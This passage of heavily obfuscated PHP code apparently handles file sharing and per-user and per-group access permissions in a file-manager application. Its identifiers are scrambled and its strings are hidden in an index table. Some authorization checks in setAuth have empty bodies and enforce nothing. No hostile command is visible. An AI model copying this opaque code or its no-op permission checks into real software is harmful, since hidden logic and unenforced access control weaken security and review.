$§ε‡Υώ))->field($Ί„Θ§£χ[194])->select(); $ρ„¦Εω• = array_to_keyvalue($ΖΛ±βάΆ, $Ί„Θ§£χ[12], $Ί„Θ§£χ[194]); $”ωΚΈ = array($Ί„Θ§£χ[194] => array($Ί„Θ§£χ[7], $ρ„¦Εω•), $Ί„Θ§£χ[567] => 1); $ΖΛ±βάΆ = $this->where($”ωΚΈ)->field($Ί„Θ§£χ[673])->select(); if (empty($ΖΛ±βάΆ)) { return; } $›ϋή©Β = array_to_keyvalue($ΖΛ±βάΆ, $Ί„Θ§£χ[12], $Ί„Θ§£χ[673]); $this->remove($›ϋή©Β); } private function shareFileMeta($ϊ¦Λδρ, $«Σήύ = null) { $¨ΓΥώΨ =& $_SERVER[γγάψ½]; $©·Νή° = array($¨ΓΥώΨ[546] => $ϊ¦Λδρ, $¨ΓΥώΨ[97] => $¨ΓΥώΨ[2180]); if (is_null($«Σήύ)) { return Model($¨ΓΥώΨ[2181])->where($©·Νή°)->find(); } $©·Νή°[$¨ΓΥώΨ[453]] = $«Σήύ; Model($¨ΓΥώΨ[2181])->add($©·Νή°, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\x63\x65\x5f\x61\165\164\x68"; public function getAuth($›υµί“Σ) { $Τ†ΦΡΫ =& $_SERVER[γγάψ½]; $¬Ϋωζ¤ = $this->sourceAuthSelect($›υµί“Σ); $ξ²›κϋ = array(); $½Σγσν„ = array(); $°Ρ®ΰΥ = 2 << 25; foreach ($¬Ϋωζ¤ as $„ν™¶ω) { $·Δ¤ηπ» = Model($Τ†ΦΡΫ[576])->listData($„ν™¶ω[$Τ†ΦΡΫ[2102]]); if (!$·Δ¤ηπ») { continue; } $ξ²›κϋ[] = $„ν™¶ω; $¨›μµ = 0; if ($„ν™¶ω[$Τ†ΦΡΫ[191]] == SourceModel::TYPE_GROUP) { $¨›μµ = $°Ρ®ΰΥ * 2; } if ($„ν™¶ω[$Τ†ΦΡΫ[191]] == SourceModel::TYPE_USER) { $¨›μµ = $°Ρ®ΰΥ; } if ($„ν™¶ω[$Τ†ΦΡΫ[191]] == SourceModel::TYPE_USER && $„ν™¶ω[$Τ†ΦΡΫ[574]] == $Τ†ΦΡΫ[231]) { $¨›μµ = 0; } $½Σγσν„[] = $·Δ¤ηπ»[$Τ†ΦΡΫ[490]] + $¨›μµ; } array_multisort($½Σγσν„, SORT_DESC, $ξ²›κϋ); return $ξ²›κϋ; } public function sourceAuthSelect($Ι§¥Ά) { $ίΉ–Σ»¦ =& $_SERVER[γγάψ½]; static $ΧΎΡ¶τΩ = array(); $¦ζ›‘Έμ = is_array($Ι§¥Ά) ? !1 : !0; if ($¦ζ›‘Έμ) { $Ι§¥Ά = array($Ι§¥Ά); } $³Σ®¤›ς = array(); foreach ($Ι§¥Ά as $Ω»ƒΡµ) { if (isset($ΧΎΡ¶τΩ[$Ω»ƒΡµ])) { $³Σ®¤›ς[$Ω»ƒΡµ] = $ΧΎΡ¶τΩ[$Ω»ƒΡµ]; } } if (count($³Σ®¤›ς) == count($Ι§¥Ά)) { return $¦ζ›‘Έμ ? $³Σ®¤›ς[$Ι§¥Ά[0]] : $³Σ®¤›ς; } $Κ”‚―½‘ = $ίΉ–Σ»¦[2182]; $ύ‰«ΕΖσ = array($ίΉ–Σ»¦[194] => array($ίΉ–Σ»¦[7], $Ι§¥Ά)); $Οκ›χζα = $this->field($Κ”‚―½‘)->order($ίΉ–Σ»¦[478])->where($ύ‰«ΕΖσ)->select(); $•ΜΓα = array_to_keyvalue_group($Οκ›χζα, $ίΉ–Σ»¦[194]); foreach ($Ι§¥Ά as $Ω»ƒΡµ) { $ΧΎΡ¶τΩ[$Ω»ƒΡµ] = $•ΜΓα[$Ω»ƒΡµ] ? $•ΜΓα[$Ω»ƒΡµ] : array(); } if ($¦ζ›‘Έμ) { return $Οκ›χζα; } return $•ΜΓα; } public function setAuth($Ή¥Ω•Δι, $ΌΞ‘¶Φ¦) { $…ράϋύ =& $_SERVER[γγάψ½]; $ΡΎ‚Ύγ = Model($…ράϋύ[1439])->sourceInfo($Ή¥Ω•Δι); if (!$ΡΎ‚Ύγ) { return !1; } if ($ΡΎ‚Ύγ[$…ράϋύ[191]] != SourceModel::TYPE_GROUP) { return !1; } $ίΌΈ«Γ = 1; $κΜ―ού = $ΡΎ‚Ύγ[$…ράϋύ[574]]; if ($κΜ―ού != $ίΌΈ«Γ) { $ΎΠΝδΎό = array($…ράϋύ[1401] => $κΜ―ού); $…τ΅Ε³ = Model($…ράϋύ[2088])->field($…ράϋύ[1793])->where($ΎΠΝδΎό)->select(); $…τ΅Ε³ = array_to_keyvalue($…τ΅Ε³, $…ράϋύ[12], $…ράϋύ[1793]); } $Λ¥εΦ£ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $κμΒς = array(); foreach ($ΌΞ‘¶Φ¦ as $Σ–ΟΜΈ’) { if (!in_array($Σ–ΟΜΈ’[$…ράϋύ[191]], $Λ¥εΦ£)) { show_json(LNG($…ράϋύ[2183]), !1); } if ($κΜ―ού != $ίΌΈ«Γ) { if ($Σ–ΟΜΈ’[$…ράϋύ[191]] == SourceModel::TYPE_GROUP) { } if ($Σ–ΟΜΈ’[$…ράϋύ[574]] != 0 && !in_array($Σ–ΟΜΈ’[$…ράϋύ[574]], $…τ΅Ε³)) { } } if ($Σ–ΟΜΈ’[$…ράϋύ[574]] == 0) { $Σ–ΟΜΈ’[$…ράϋύ[191]] = SourceModel::TYPE_USER; } $κμΒς[] = array($…ράϋύ[194] => $Ή¥Ω•Δι, $…ράϋύ[191] => intval($Σ–ΟΜΈ’[$…ράϋύ[191]]), $…ράϋύ[574] => intval($Σ–ΟΜΈ’[$…ράϋύ[574]]), $…ράϋύ[2102] => intval($Σ–ΟΜΈ’[$…ράϋύ[2102]]) ? intval($Σ–ΟΜΈ’[$…ράϋύ[2102]]) : 0, $…ράϋύ[2165] => intval($Σ–ΟΜΈ’[$…ράϋύ[2165]]) ? intval($Σ–ΟΜΈ’[$…ράϋύ[2165]]) : -1); } $this->where(array($…ράϋύ[494] => $Ή¥Ω•Δι))->delete(); $this->addAll($κμΒς); return !0; } public function authClear($Ι¶ΊφΘ) { $ιΊσ³­± =& $_SERVER[γγάψ½]; $Νξΰ΄ = Model($ιΊσ³­±[1439])->sourceInfo($Ι¶ΊφΘ); $Ί¤εην = array($Ι¶ΊφΘ); if ($Νξΰ΄[$ιΊσ³­±[488]] == $ιΊσ³­±[91]) { $¬­’ΰΊ = array($ιΊσ³­±[660] => array($ιΊσ³­±[620], $Νξΰ΄[$ιΊσ³­±[589]] . $Ι¶ΊφΘ . $ιΊσ³­±[621])); $Ί¤εην = Model($ιΊσ³­±[1439])->field($ιΊσ³­±[494])->where($¬­’ΰΊ)->getField($ιΊσ³­±[194], !0); $Ί¤εην[] = $Ι¶ΊφΘ; } $this->where(array($ιΊσ³­±[494] => array($ιΊσ³­±[495], $Ί¤εην)))->delete(); return !0; } public function getAllChildren($¬§ΧωΚΝ) { $µΛρΑ­— =& $_SERVER[γγάψ½]; $­‘ςίΪ = Model($µΛρΑ­—[1439])->sourceInfo($¬§ΧωΚΝ); if ($­‘ςίΪ[$µΛρΑ­—[488]] != $µΛρΑ­—[91]) { return $this->sourceListAuth(array($¬§ΧωΚΝ)); } if ($­‘ςίΪ[$µΛρΑ­—[191]] != SourceModel::TYPE_GROUP) { return array(); } $ρ’ΖΟ» = 1; $Φ„…¥Τ = array($¬§ΧωΚΝ); if ($­‘ςίΪ[$µΛρΑ­—[193]] == $µΛρΑ­—[231] && $­‘ςίΪ[$µΛρΑ­—[574]] != $ρ’ΖΟ») { $Φ„…¥Τ = $this->groupChidldAllRootSource($­‘ςίΪ[$µΛρΑ­—[574]]); } $‰ƒΊι•α = $this->field($µΛρΑ­—[194])->group($µΛρΑ­—[194])->select(); $‰ƒΊι•α = array_to_keyvalue($‰ƒΊι•α, $µΛρΑ­—[12], $µΛρΑ­—[194]); if (!$‰ƒΊι•α) { return array(); } $—τµΕ = $µΛρΑ­—[2184]; $΄§άώΐ§ = array($µΛρΑ­—[194] => array($µΛρΑ­—[7], $‰ƒΊι•α), $µΛρΑ­—[508] => $µΛρΑ­—[231]); $ώ¶όΜΛ = Model($µΛρΑ­—[905])->field($—τµΕ)->where($΄§άώΐ§)->select(); $›·¤ΊΧ = array($¬§ΧωΚΝ); foreach ($ώ¶όΜΛ as $¤ΉΤ°σ) { foreach ($Φ„…¥Τ as $©Χ°ΖΣΤ) { $ϋΪ¤»’ = $µΛρΑ­—[50] . $©Χ°ΖΣΤ . $µΛρΑ­—[50]; $χΤ²ΕΦ• = $¤ΉΤ°σ[$µΛρΑ­—[589]] . $¤ΉΤ°σ[$µΛρΑ­—[194]] . $µΛρΑ­—[50]; if (strstr($χΤ²ΕΦ•, $ϋΪ¤»’)) { $›·¤ΊΧ[] = $¤ΉΤ°σ[$µΛρΑ­—[194]]; break; } } } return $this->sourceListAuth($›·¤ΊΧ); } private function sourceListAuth($λέµΪ ») { $Ο„‚Ϊ±¶ =& $_SERVER[γγάψ½]; $εωΛ΅ = Model($Ο„‚Ϊ±¶[1439])->sourceListInfo($λέµΪ », !0); $ω”Όµ‚ = $this->sourceAuthSelect($λέµΪ »); $άδόττ = array(); $εηξ§Β› = array(); foreach ($εωΛ΅ as $ώΌΒώ) { unset($ώΌΒώ[$Ο„‚Ϊ±¶[532]]); unset($ώΌΒώ[$Ο„‚Ϊ±¶[530]]); unset($ώΌΒώ[$Ο„‚Ϊ±¶[490]]); unset($ώΌΒώ[$Ο„‚Ϊ±¶[90]]); $ςΚ°¬ξ = $ω”Όµ‚[$ώΌΒώ[$Ο„‚Ϊ±¶[194]]]; if (!$ςΚ°¬ξ) { continue; } $ώΌΒώ[$Ο„‚Ϊ±¶[2185]] = $this->authTargetInfo($ςΚ°¬ξ); $ώΌΒώ[$Ο„‚Ϊ±¶[587]] = rtrim($ώΌΒώ[$Ο„‚Ϊ±¶[593]], $Ο„‚Ϊ±¶[8]) . $Ο„‚Ϊ±¶[8] . ltrim($ώΌΒώ[$Ο„‚Ϊ±¶[587]], $Ο„‚Ϊ±¶[8]); $άδόττ[] = $ώΌΒώ; $ζΝΩΏ Ε = count(explode($Ο„‚Ϊ±¶[8], trim($ώΌΒώ[$Ο„‚Ϊ±¶[587]], $Ο„‚Ϊ±¶[8]))); $εηξ§Β›[] = $ζΝΩΏ Ε + ($ώΌΒώ[$Ο„‚Ϊ±¶[33]] == $Ο„‚Ϊ±¶[78] ? 0 : 1000); } array_multisort($εηξ§Β›, SORT_ASC, $άδόττ); return $άδόττ; } private function groupChidldAllRootSource($οΕΉϊκ–) { $ΩιβΤϊ =& $_SERVER[γγάψ½]; $ι–΄‰Ξ = Model($ΩιβΤϊ[1399])->groupChildrenAll($οΕΉϊκ–); $ΦΫω―³Λ = array($ΩιβΤϊ[193] => 0, $ΩιβΤϊ[574] => array($ΩιβΤϊ[7], $ι–΄‰Ξ), $ΩιβΤϊ[191] => SourceModel::TYPE_GROUP); $θΛ·Φ‘θ = Model($ΩιβΤϊ[905])->field($ΩιβΤϊ[194])->where($ΦΫω―³Λ)->select(); $θΛ·Φ‘θ = array_to_keyvalue($θΛ·Φ‘θ, $ΩιβΤϊ[12], $ΩιβΤϊ[194]); return $θΛ·Φ‘θ; } private function authTargetInfo($«Ι©ά) { $€‚Γ£¶ =& $_SERVER[γγάψ½]; $¬ε’ϊ–Ϊ = array(); $…δ½Ά = array(); $ρ§΄ΗΏ = 2 << 25; foreach ($«Ι©ά as $Ϋ¶Ξ½ƒ) { $—Έ¨«ώ = Model($€‚Γ£¶[576])->listData($Ϋ¶Ξ½ƒ[$€‚Γ£¶[2102]]); if (!$—Έ¨«ώ) { continue; } if ($Ϋ¶Ξ½ƒ[$€‚Γ£¶[191]] == SourceModel::TYPE_USER) { $ιβΘ¬» = Model($€‚Γ£¶[582])->getInfoSimpleOuter($Ϋ¶Ξ½ƒ[$€‚Γ£¶[574]]); if ($ιβΘ¬»[$€‚Γ£¶[1793]] == $€‚Γ£¶[1284]) { continue; } if ($ιβΘ¬»[$€‚Γ£¶[1793]] == $€‚Γ£¶[231]) { $ιβΘ¬»[$€‚Γ£¶[32]] = LNG($€‚Γ£¶[2186]); } } else { $ιβΘ¬» = Model($€‚Γ£¶[590])->getInfoSimple($Ϋ¶Ξ½ƒ[$€‚Γ£¶[574]]); } if (!$ιβΘ¬») { continue; } $ιβΘ¬»[$€‚Γ£¶[545]] = $—Έ¨«ώ; $¬ε’ϊ–Ϊ[] = $ιβΘ¬»; $ΑΝ„ζΦΪ = 0; if ($Ϋ¶Ξ½ƒ[$€‚Γ£¶[191]] == SourceModel::TYPE_GROUP) { $ΑΝ„ζΦΪ = $ρ§΄ΗΏ * 2; } if ($Ϋ¶Ξ½ƒ[$€‚Γ£¶[191]] == SourceModel::TYPE_USER) { $ΑΝ„ζΦΪ = $ρ§΄ΗΏ; } if ($Ϋ¶Ξ½ƒ[$€‚Γ£¶[191]] == SourceModel::TYPE_USER && $Ϋ¶Ξ½ƒ[$€‚Γ£¶[574]] == $€‚Γ£¶[231]) { $ΑΝ„ζΦΪ = 0; } $…δ½Ά[] = $—Έ¨«ώ[$€‚Γ£¶[490]] + $ΑΝ„ζΦΪ; } array_multisort($…δ½Ά, SORT_DESC, $¬ε’ϊ–Ϊ); return $¬ε’ϊ–Ϊ; } public function getAllChildrenByUser($™ώ¨ο¥ζ, $Ό“Α§Γ²) { $δήωΒΫ“ =& $_SERVER[γγάψ½]; $›ΜΏ¬¶Τ = Model($δήωΒΫ“[602])->getInfo($Ό“Α§Γ²); if (!$Ό“Α§Γ² || !$™ώ¨ο¥ζ || !$›ΜΏ¬¶Τ) { return array(); } $°δ‡ϋήμ = Model($δήωΒΫ“[1439])->sourceInfo($™ώ¨ο¥ζ); $Ηϋ€ί’ = array(); $…«‹±­λ = 1; if ($°δ‡ϋήμ[$δήωΒΫ“[193]] == $δήωΒΫ“[231] && $°δ‡ϋήμ[$δήωΒΫ“[574]] != $…«‹±­λ && $this->groupContainUser($°δ‡ϋήμ[$δήωΒΫ“[574]], $Ό“Α§Γ²)) { foreach ($›ΜΏ¬¶Τ[$δήωΒΫ“[1400]] as $»…©²ζ•) { $ω«ύΠΓ΄ = Model($δήωΒΫ“[590])->getInfo($»…©²ζ•[$δήωΒΫ“[1401]]); $φ„¶Ψλ» = Model($δήωΒΫ“[602])->getInfoSimpleOuter($Ό“Α§Γ²); $φ„¶Ψλ»[$δήωΒΫ“[545]] = $»…©²ζ•[$δήωΒΫ“[490]]; if (Model($δήωΒΫ“[576])->authCheckAction($»…©²ζ•[$δήωΒΫ“[490]][$δήωΒΫ“[490]], $δήωΒΫ“[2014])) { continue; } $¶νξ€™μ = array($δήωΒΫ“[32] => $δήωΒΫ“[1304] . $ω«ύΠΓ΄[$δήωΒΫ“[32]], $δήωΒΫ“[194] => $ω«ύΠΓ΄[$δήωΒΫ“[90]][$δήωΒΫ“[194]], $δήωΒΫ“[87] => KodIO::make($ω«ύΠΓ΄[$δήωΒΫ“[90]][$δήωΒΫ“[194]]), $δήωΒΫ“[193] => $δήωΒΫ“[231], $δήωΒΫ“[191] => $δήωΒΫ“[583], $δήωΒΫ“[33] => $δήωΒΫ“[624], $δήωΒΫ“[587] => $ω«ύΠΓ΄[$δήωΒΫ“[594]], $δήωΒΫ“[1401] => $ω«ύΠΓ΄[$δήωΒΫ“[1401]], $δήωΒΫ“[591] => $ω«ύΠΓ΄[$δήωΒΫ“[193]], $δήωΒΫ“[2185] => array($φ„¶Ψλ»)); $Ηϋ€ί’[$¶νξ€™μ[$δήωΒΫ“[194]]] = $¶νξ€™μ; } } $•–½² = array(); $Πΰρ΄Π = $this->getAllChildren($™ώ¨ο¥ζ); foreach ($Πΰρ΄Π as $ΐ…Κδ„) { $ ΔΉ΅° = !1; foreach ($ΐ…Κδ„[$δήωΒΫ“[2185]] as $—Ή°τΑ‰) { if ($—Ή°τΑ‰[$δήωΒΫ“[1793]]) { if ($—Ή°τΑ‰[$δήωΒΫ“[1793]] == $Ό“Α§Γ²) { $ ΔΉ΅° = !0; break; } } if ($—Ή°τΑ‰[$δήωΒΫ“[1401]]) { if ($this->groupContainUser($—Ή°τΑ‰[$δήωΒΫ“[1401]], $Ό“Α§Γ²)) { $ ΔΉ΅° = !0; break; } } } if ($ ΔΉ΅°) { $•–½²[] = $ΐ…Κδ„; } $μ§α―δτ = $ΐ…Κδ„[$δήωΒΫ“[194]]; if (isset($Ηϋ€ί’[$μ§α―δτ])) { $ΐ…Κδ„[$δήωΒΫ“[2185]][] = $Ηϋ€ί’[$μ§α―δτ][0]; $Ηϋ€ί’[$μ§α―δτ] = !1; } } $Ηϋ€ί’ = array_filter(array_values($Ηϋ€ί’)); $•–½² = array_merge($Ηϋ€ί’, $•–½²); return $•–½²; } public function setAllChildrenByUser($φΝωιΞ™, $ψο“γΝ―, $ΰ»Ά¤) { $ΔοήΪ‘ =& $_SERVER[γγάψ½]; $―ϊγδ§‰ = $this->getAllChildrenByUser($φΝωιΞ™, $ψο“γΝ―); if (!$ΰ»Ά¤ || !$―ϊγδ§‰) { return !1; } foreach ($―ϊγδ§‰ as $η‘›Όβ) { $‡΅³πΗ = array(); foreach ($η‘›Όβ[$ΔοήΪ‘[2185]] as $‚‰αΣ†) { $€–°όι = $‚‰αΣ†[$ΔοήΪ‘[545]]; $ΈΓ»ηα = $‚‰αΣ†[$ΔοήΪ‘[1793]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Β·Νδω­ = $‚‰αΣ†[$ΔοήΪ‘[1793]] ? $‚‰αΣ†[$ΔοήΪ‘[1793]] : $‚‰αΣ†[$ΔοήΪ‘[1401]]; if ($‚‰αΣ†[$ΔοήΪ‘[1793]] && $‚‰αΣ†[$ΔοήΪ‘[1793]] == $ψο“γΝ―) { continue; } $‡΅³πΗ[] = array($ΔοήΪ‘[194] => $η‘›Όβ[$ΔοήΪ‘[194]], $ΔοήΪ‘[191] => $ΈΓ»ηα, $ΔοήΪ‘[574] => intval($Β·Νδω­), $ΔοήΪ‘[2102] => isset($€–°όι[$ΔοήΪ‘[478]]) ? intval($€–°όι[$ΔοήΪ‘[478]]) : 0, $ΔοήΪ‘[2165] => isset($€–°όι[$ΔοήΪ‘[2165]]) ? intval($€–°όι[$ΔοήΪ‘[2165]]) : -1); } $‡΅³πΗ[] = array($ΔοήΪ‘[194] => $η‘›Όβ[$ΔοήΪ‘[194]], $ΔοήΪ‘[191] => SourceModel::TYPE_USER, $ΔοήΪ‘[574] => intval($ψο“γΝ―), $ΔοήΪ‘[2102] => intval($ΰ»Ά¤), $ΔοήΪ‘[2165] => -1); $this->where(array($ΔοήΪ‘[494] => $η‘›Όβ[$ΔοήΪ‘[194]]))->delete(); $this->addAll($‡΅³πΗ); } return !0; } public function get($Φ­²—¬) { $ηϊΦΊ£ω = $this->getSourceList(array($Φ­²—¬), !0); return $ηϊΦΊ£ω[0]; } public function getSourceList($Ψ¤·ξƒπ, $Η®ϋ‹ό¥ = false, $Λ§θΰ = false) { $Λ³±Ίεο =& $_SERVER[γγάψ½]; if (!$Ψ¤·ξƒπ) { return array(); } $ι›ΌΉχΪ = Model($Λ³±Ίεο[1439]); if (!$Η®ϋ‹ό¥ && count($Ψ¤·ξƒπ) == 1) { $Η®ϋ‹ό¥ = array(); $Η®ϋ‹ό¥[$Ψ¤·ξƒπ[0]] = $ι›ΌΉχΪ->sourceInfo($Ψ¤·ξƒπ[0]); } if (!$Η®ϋ‹ό¥) { $ύΎ‹Δ  = array($Λ³±Ίεο[494] => array($Λ³±Ίεο[495], $Ψ¤·ξƒπ)); $Η®ϋ‹ό¥ = $ι›ΌΉχΪ->field($Λ³±Ίεο[2187])->where($ύΎ‹Δ )->select(); $Η®ϋ‹ό¥ = array_to_keyvalue($Η®ϋ‹ό¥, $Λ³±Ίεο[194]); } $‹υ ϋζ‹ = $Ψ¤·ξƒπ; foreach ($Η®ϋ‹ό¥ as $Κυλ•ρ› => $Έ•¨΅Ρ) { $ΐƒκΙϋ = $ι›ΌΉχΪ->parentLevelArray($Έ•¨΅Ρ[$Λ³±Ίεο[589]]); $‹υ ϋζ‹ = array_merge($‹υ ϋζ‹, array($Κυλ•ρ›), array_reverse($ΐƒκΙϋ)); } $‹υ ϋζ‹ = array_values(array_unique($‹υ ϋζ‹)); if (!$‹υ ϋζ‹) { return array(); } $ε¤“΄Θ = $this->sourceAuthSelect($‹υ ϋζ‹); $ΫΐΪ†‹ρ = array(); foreach ($‹υ ϋζ‹ as $“―—Σ») { if (isset($ε¤“΄Θ[$“―—Σ»])) { $ΫΐΪ†‹ρ[$“―—Σ»] = $ε¤“΄Θ[$“―—Σ»]; } } $μ‘Λ­‘ = $this->userIsRoot($Λ§θΰ); $ι΅‹ = AuthModel::authAll(); $©Μ·ά = array($Λ³±Ίεο[491] => $ι΅‹, $Λ³±Ίεο[2188] => array($Λ³±Ίεο[496] => 0, $Λ³±Ίεο[1999] => $ι΅‹, $Λ³±Ίεο[497] => LNG($Λ³±Ίεο[2189]), $Λ³±Ίεο[2016] => $Λ³±Ίεο[2190])); $ρωψΘκ = array(); foreach ($Η®ϋ‹ό¥ as $“―—Σ» => $³Κέάϊ½) { if ($μ‘Λ­‘ && $GLOBALS[$Λ³±Ίεο[6]][$Λ³±Ίεο[2012]]) { $ρωψΘκ[$“―—Σ»] = $©Μ·ά; continue; } $ρωψΘκ[$“―—Σ»] = $this->makeSourceAuth($³Κέάϊ½, $ΫΐΪ†‹ρ, $Λ§θΰ); } return $ρωψΘκ; } public function authDeepCheck($‰ΧΨθ¥, $‘πΕ = false) { $ΙώΌΔΚς =& $_SERVER[γγάψ½]; $‘πΕ = $‘πΕ ? $‘πΕ : USER_ID; $Υσξ‘ΆΘ = $this->makeAuthDeep($‘πΕ); if (!in_array($‰ΧΨθ¥, $Υσξ‘ΆΘ[$ΙώΌΔΚς[2191]])) { return !1; } $¬ΑπίΙ = array(); foreach ($Υσξ‘ΆΘ[$ΙώΌΔΚς[2192]] as $΅Ώλ²¬Ψ => $― πγϊ) { if (!in_array($‰ΧΨθ¥, $― πγϊ)) { continue; } $¬ΑπίΙ[] = $΅Ώλ²¬Ψ; } if (!$¬ΑπίΙ) { return !1; } $“ΒƒΌ§ό = $¬ΑπίΙ ? $¬ΑπίΙ[0] : $‰ΧΨθ¥; return array($ΙώΌΔΚς[491] => -1, $ΙώΌΔΚς[545] => array($ΙώΌΔΚς[496] => $ΙώΌΔΚς[1284], $ΙώΌΔΚς[1999] => $ΙώΌΔΚς[231], $ΙώΌΔΚς[497] => LNG($ΙώΌΔΚς[2193]), $ΙώΌΔΚς[2016] => $ΙώΌΔΚς[2194]), $ΙώΌΔΚς[2195] => LNG($ΙώΌΔΚς[2196]), $ΙώΌΔΚς[2197] => $this->sourceAuthInfo($“ΒƒΌ§ό)); } protected function makeAuthDeep($ά•Οΐη— = false) { $ώ¬‹Μ =& $_SERVER[γγάψ½]; static $„σΤΑμΏ = array(); $ά•Οΐη— = $ά•Οΐη— ? $ά•Οΐη— : USER_ID; if (isset($„σΤΑμΏ[$ά•Οΐη—])) { return $„σΤΑμΏ[$ά•Οΐη—]; } $ΒΎ½Φ = Model($ώ¬‹Μ[2198])->listData(); $®σΙΏζΦ = array(); foreach ($ΒΎ½Φ as $›ζδάΨ¶) { if ($›ζδάΨ¶[$ώ¬‹Μ[490]] == 0 && $›ζδάΨ¶[$ώ¬‹Μ[2015]] == $ώ¬‹Μ[91]) { $®σΙΏζΦ[] = $›ζδάΨ¶[$ώ¬‹Μ[478]]; } } $ώΓ…Ψ® = $this->userGroupParents($ά•Οΐη—); $±ΐΈι‡– = array($ώ¬‹Μ[191] => SourceModel::TYPE_USER, $ώ¬‹Μ[574] => $ά•Οΐη—); if ($ώΓ…Ψ®) { $±ΐΈι‡– = array(array($ώ¬‹Μ[191] => SourceModel::TYPE_USER, $ώ¬‹Μ[574] => $ά•Οΐη—), array($ώ¬‹Μ[191] => SourceModel::TYPE_GROUP, $ώ¬‹Μ[574] => array($ώ¬‹Μ[495], $ώΓ…Ψ®)), $ώ¬‹Μ[1086] => $ώ¬‹Μ[2096]); } $Ϊ”ιυ‰ = $this->field($ώ¬‹Μ[2199])->where($±ΐΈι‡–)->select(); $”η€Θλ = array(); $λεξ΄Νυ = array_to_keyvalue_group($Ϊ”ιυ‰, $ώ¬‹Μ[194]); foreach ($λεξ΄Νυ as $ΖΟΗφ›ό => $Οι„Ά®) { $ΒΣ»ξζ = $this->authArrayCheck($Οι„Ά®, $ά•Οΐη—); if ($ΒΣ»ξζ[$ώ¬‹Μ[491]] > 0) { $”η€Θλ[] = $ΖΟΗφ›ό . $ώ¬‹Μ[12]; } } if ($ώΓ…Ψ®) { $ϋΈυΉ’φ = Model($ώ¬‹Μ[590]); foreach ($ώΓ…Ψ® as $μΟϊ‘Ο‚) { $Ζ’Ϋ—Ι = $ϋΈυΉ’φ->getInfo($μΟϊ‘Ο‚); if (!$Ζ’Ϋ—Ι || !is_array($Ζ’Ϋ—Ι[$ώ¬‹Μ[90]])) { continue; } $”η€Θλ[] = $Ζ’Ϋ—Ι[$ώ¬‹Μ[90]][$ώ¬‹Μ[194]]; } } $†χ±ζλ = array(); $£ ίήΜ = $ώΓ…Ψ®; $¤ϋθ¦ξ = Model($ώ¬‹Μ[1439]); $ϋΈυΉ’φ = Model($ώ¬‹Μ[590]); $διΐπΆ = array(); $βκ Ρώ = array(); $™ΗΊ = array(); $Ώϊξ = array(); if ($”η€Θλ) { $Όμ΅ΜƒΒ = $¤ϋθ¦ξ->where(array($ώ¬‹Μ[194] => array($ώ¬‹Μ[495], $”η€Θλ)))->select(); foreach ($Όμ΅ΜƒΒ as $½Κ©Ύϋ) { if ($½Κ©Ύϋ[$ώ¬‹Μ[508]] == $ώ¬‹Μ[91]) { continue; } $¨οω”Έ = $¤ϋθ¦ξ->parentLevelArray($½Κ©Ύϋ[$ώ¬‹Μ[589]]); $†χ±ζλ = array_merge($†χ±ζλ, $¨οω”Έ); $£ ίήΜ[] = $½Κ©Ύϋ[$ώ¬‹Μ[574]]; $διΐπΆ[$½Κ©Ύϋ[$ώ¬‹Μ[194]]] = $¨οω”Έ; $βκ Ρώ[$½Κ©Ύϋ[$ώ¬‹Μ[194]]] = $½Κ©Ύϋ[$ώ¬‹Μ[574]]; } } $£ ίήΜ = array_values(array_unique($£ ίήΜ)); $σσ­²– = $£ ίήΜ; foreach ($σσ­²– as $μΟϊ‘Ο‚) { $Ζ’Ϋ—Ι = $ϋΈυΉ’φ->getInfo($μΟϊ‘Ο‚); $¨οω”Έ = $¤ϋθ¦ξ->parentLevelArray($Ζ’Ϋ—Ι[$ώ¬‹Μ[589]]); $£ ίήΜ = array_merge($£ ίήΜ, $¨οω”Έ); } $£ ίήΜ = array_values(array_unique($£ ίήΜ)); foreach ($£ ίήΜ as $μΟϊ‘Ο‚) { $Ζ’Ϋ—Ι = $ϋΈυΉ’φ->getInfo($μΟϊ‘Ο‚); $†χ±ζλ[] = $Ζ’Ϋ—Ι[$ώ¬‹Μ[90]][$ώ¬‹Μ[194]]; $™ΗΊ[$μΟϊ‘Ο‚] = $Ζ’Ϋ—Ι[$ώ¬‹Μ[90]][$ώ¬‹Μ[194]]; $Ώϊξ[$μΟϊ‘Ο‚] = $¤ϋθ¦ξ->parentLevelArray($Ζ’Ϋ—Ι[$ώ¬‹Μ[589]]); } foreach ($διΐπΆ as $ξώψ· › => $€ΌμΒ°) { $τΐ΄Ψ = $βκ Ρώ[$ξώψ· ›]; if (!$τΐ΄Ψ || !$™ΗΊ[$τΐ΄Ψ]) { continue; } $ΧΤΑ•ω΄ = array(); foreach ($Ώϊξ[$τΐ΄Ψ] as $μΟϊ‘Ο‚) { $ΧΤΑ•ω΄[] = $™ΗΊ[$μΟϊ‘Ο‚]; } $διΐπΆ[$ξώψ· ›] = array_merge($ΧΤΑ•ω΄, $€ΌμΒ°); } $†χ±ζλ = array_values(array_unique($†χ±ζλ)); $ηωδιΫη = array($ώ¬‹Μ[2191] => $†χ±ζλ, $ώ¬‹Μ[2192] => $διΐπΆ); $„σΤΑμΏ[$ά•Οΐη—] = $ηωδιΫη; return $ηωδιΫη; } private function makeSourceAuth($ΦΒΫΖ¬€, $Δώ¨ε, $ΧΙΒΤ² = false) { $²ο–» =& $_SERVER[γγάψ½]; $³ΊΨ°Χµ = $²ο–»[91]; $²†ώΙΙΖ = $ΦΒΫΖ¬€[$²ο–»[574]]; $ ΗΡ“Ή = $ΦΒΫΖ¬€[$²ο–»[191]] == SourceModel::TYPE_GROUP; $ΰτάΌΊπ = $ ΗΡ“Ή ? $this->groupRootAuth($²†ώΙΙΖ, $ΧΙΒΤ²) : !1; if ($ΰτάΌΊπ && Model($²ο–»[576])->authCheckAction($ΰτάΌΊπ[$²ο–»[490]], $²ο–»[2014])) { return $this->groupAuthInfo($ΰτάΌΊπ, $²†ώΙΙΖ); } $ƒΕΛρ = Model($²ο–»[1439])->parentLevelArray($ΦΒΫΖ¬€[$²ο–»[589]]); $ƒΕΛρ = array_merge(array($ΦΒΫΖ¬€[$²ο–»[194]]), array_reverse($ƒΕΛρ)); $νΗϊΈ = !1; foreach ($ƒΕΛρ as $‡Α³ρ΄) { if (!isset($Δώ¨ε[$‡Α³ρ΄])) { continue; } $ΰ³ξδ²΄ = $this->authMake($Δώ¨ε[$‡Α³ρ΄], $ΧΙΒΤ²); if ($ΰ³ξδ²΄[$²ο–»[545]]) { $νΗϊΈ = $ΰ³ξδ²΄; break; } } if (!$ 